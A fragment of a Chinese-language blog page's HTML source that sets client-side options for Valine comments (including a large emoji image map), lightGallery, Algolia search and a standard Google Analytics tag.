type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"iAbQo5y0XlBlUP9F0K3Tyx8f-MdYXbMMI","appKey":"ML5YMAAFe45gCJawVJcUkrg0","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":null,"highlight":true,"lang":"zh-cn","placeholder":"你的评论 ...","recordIP":null,"visitor":null}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"3M3B3KM4LG","algoliaIndex":"blog","algoliaSearchKey":"babfa85706a3a4a0025db8ff2fdf3525","highlightTag":null,"maxResultLength":null,"noResultsFound":"没有找到结果","snippetLength":null,"type":"algolia"}};</script><script src="/js/theme.min.js" type="text/javascript"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'UA-160185073-2');
+        </script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-160185073-2" type="text/javascript"></script></body>
+</html>
